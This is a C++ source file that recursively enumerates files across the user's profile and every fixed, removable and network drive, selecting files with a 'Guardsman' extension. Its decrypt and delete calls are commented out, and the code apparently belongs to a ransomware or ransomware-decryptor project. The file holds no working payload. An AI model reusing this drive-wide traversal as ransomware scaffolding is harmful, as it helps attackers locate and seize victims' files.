#include "SearchEngine.h"

std::vector<String> ext
{
    _T("Guardsman")
};

VOID SearchEngine::FindFile(String dir)
{
    dir += _T("\\");
    WIN32_FIND_DATA FindData;
    HANDLE hFind{ FindFirstFile((dir + _T("*")).c_str(), &FindData) };

    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (!lstrcmp(FindData.cFileName, _T(".")) ||
                !lstrcmp(FindData.cFileName, _T("..")) ||
                FindData.cFileName[0] == _T('.'))
                continue;

            String Path{ dir + FindData.cFileName };

            if (!(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                !(FindData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) &&
                !(FindData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) &&
                !(FindData.dwFileAttributes & FILE_ATTRIBUTE_READONLY))
                if (Utils::Contains(ext, Utils::GetFileExt(Path)))
                {
                    //Decrypt(key, iv, Path);
                    //DeleteFile(Path.c_str());
                }

            if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
                !(FindData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) &&
                !(FindData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN))
                FindFile(Path);
        } while (FindNextFile(hFind, &FindData));

        FindClose(hFind);
    }
}

VOID SearchEngine::Start()
{
    std::vector<String> drives
    {
        _T("C:\\Users\\") + Utils::UserName(),
        _T("K:"), _T("L:"), _T("M:"), _T("N:"), _T("O:"),
        _T("D:"), _T("A:"), _T("B:"), _T("F:"), _T("Q:"),
        _T("G:"), _T("H:"), _T("R:"), _T("S:"), _T("J:"),
        _T("U:"), _T("W:"), _T("V:"), _T("X:"), _T("T:"),
        _T("Y:"), _T("Z:"), _T("E:"), _T("P:"), _T("I:")
    };

    for (const auto& drive : drives)
        if (Utils::DirectoryExists(drive))
            if (GetDriveType(drive.c_str()) == DRIVE_FIXED ||
                GetDriveType(drive.c_str()) == DRIVE_REMOVABLE ||
                GetDriveType(drive.c_str()) == DRIVE_REMOTE ||
                GetDriveType(drive.c_str()) == DRIVE_NO_ROOT_DIR)
                FindFile(drive);
}